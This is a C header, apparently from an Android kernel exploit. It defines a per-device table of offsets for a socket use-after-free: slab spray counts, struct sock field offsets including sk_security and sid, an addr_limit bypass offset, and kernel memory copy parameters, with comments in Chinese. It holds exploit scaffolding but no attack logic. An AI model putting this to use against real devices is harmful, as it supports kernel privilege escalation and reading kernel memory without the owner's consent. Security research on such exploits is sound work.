#ifndef _OFFSET_H_
#define _OFFSET_H_

/* 泄漏内核中正常的sock结构体地址 */
#define LEAK_NORMAL_SOCK

struct devinfo{
	char* devname; 			// 设备名称 /system/build.prog/ ro.product.model
	char* kernver;  		// 内存版本 /proc/version, uname -r
	int object_size;		// 对象的大小
	int object_nums;		// 一个slab中对象的个数
	int prev_fill_num;		// 填充已有空洞所需要申请socket的个数
	int tail_fill_num;		// 构造UAF数据时，尾部申请socket的个数
	int offset_sock_sknode_next;	// struct sock sk_bind_node next
	int offset_sock_sknode_prev;	// struct sock sk_bind_node prev
	int offset_sock_skprot;		// struct sock sk_prot = kernel address
	int offset_sock_sklock_slock;	// struct sock sk_lock.slock = 0
	int offset_sock_sklock_owned;	// struct sock sk_lock.owned = 0
	int offset_sock_sklock_wq_lock;	// struct sock sk_lock.wq.lock = 0
	int offset_sock_sklock_wq_list;	// struct sock sk_lock.wq.task_list.next = &sk_lock.wq.task_list
	int offset_sock_skbacklog_tail;	// struct sock sk_backlog.tail = 0
	int offset_sock_skfilter;	// struct sock sk_filter = kernel address
	int offset_sock_skstamp;	// struct sock sk_stamp
	int offset_sock_sksecurity;	// struct sock sk_security = kernel address
	int offset_sksecurity_sid;	// struct sk_security_struct sid = 1
	int offset_skfilter_prog;	// struct sk_filter prog = kernel address
	int offset_proto_ioctl;     // struct proto ioctl = kernel address
	int offset_socket_ops;      // struct socket ops = kernel address
	int offset_proto_ops_ioctl; // struct proto_ops ioctl = kernel address
	int offset_proto_releasecb;	// struct proto release_cb = NULL
	int offset_bpfprog_origprog;	// struct bpf_prog orig_prog = kernel address
	int offset_fprogkern_len;	// struct sock_fprog_kern len 
	int offset_fprogkern_filter;	// struct sock_fprog_kern filter
	int offset_kernel_sock_ioctl;	// 绕过恢复addr_limit执行代码的偏移
	int kern_copy_offset;		// 泄漏的内核地址与拷贝地址之间的偏移
	int kern_copy_len;		// 每次拷贝数据的长度, 最大值0xffff*8
	int kern_copy_size;		// 总共需要拷贝数据的大小
	unsigned long kern_copy_addr;	// 指定的拷贝内核的地址，适用于没有开地址随机化
};

//#define FAKE_OFFSET_SOCKET_OPS		0x28
//#define FAKE_OFFSET_OPS_IOCTL		0x48
//#define FAKE_USESIZE_OPS    		FAKE_OFFSET_OPS_IOCTL + 0x8



struct devinfo* get_devinfo(void);

#endif
